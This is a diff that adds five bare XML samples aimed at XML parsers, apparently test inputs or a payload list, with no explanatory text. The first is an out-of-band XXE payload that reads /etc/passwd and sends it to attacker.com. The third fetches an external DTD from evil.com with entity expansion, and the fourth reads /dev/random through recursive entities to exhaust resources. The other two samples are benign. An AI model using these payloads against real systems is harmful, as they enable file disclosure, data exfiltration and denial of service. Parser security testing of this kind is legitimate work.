@@ -1,0 +1,66 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+  %eval;
+]>
+<root>&exfiltrate;</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE doc [
+  <!ELEMENT doc ANY>
+  <!ATTLIST doc id ID #REQUIRED>
+  <!ENTITY internal "malicious_content">
+  <!NOTATION gif PUBLIC "image/gif">
+  <!ENTITY graphic SYSTEM "image.gif" NDATA gif>
+]>
+<doc id="root_doc">
+  <![CDATA[
+    &internal; < > " ' & % $ # @ ! 
+    Special chars: \x00\x01\x02
+  ]]>
+  &graphic;
+</doc>
+```
+
+```xml
+<!DOCTYPE exploit [
+  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
+  <!ENTITY % param1 "start">
+  <!ENTITY % param2 "%param1;%param1;%param1;%param1;%param1;%param1;%param1;%param1;%param1;%param1;">
+  %dtd;
+]>
+<exploit>
+  <payload attr="%param2;">%param2;</payload>
+</exploit>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe "<!ENTITY content SYSTEM '/dev/random'>">
+  %xxe;
+  <!ENTITY recursion "&content;&content;&content;&content;&content;">
+]>
+<root>
+  <data>&recursion;&recursion;&recursion;</data>
+</root>
+```
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE html [
+  <!ENTITY % HTMLlat1 PUBLIC "-//W3C//ENTITIES Latin 1//EN//HTML" "http://www.w3.org/TR/html4/entities/HTMLlat1.ent">
+  <!ENTITY % HTMLsymbol PUBLIC "-//W3C//ENTITIES Symbols//EN//HTML" "http://www.w3.org/TR/html4/entities/HTMLsymbol.ent">
+  %HTMLlat1;
+  %HTMLsymbol;
+]>
+<html>
+  <body>
+    &nbsp;&copy;&reg;&frac14;&sum;&prod;&radic;&infin;
+  </body>
+</html>
+```
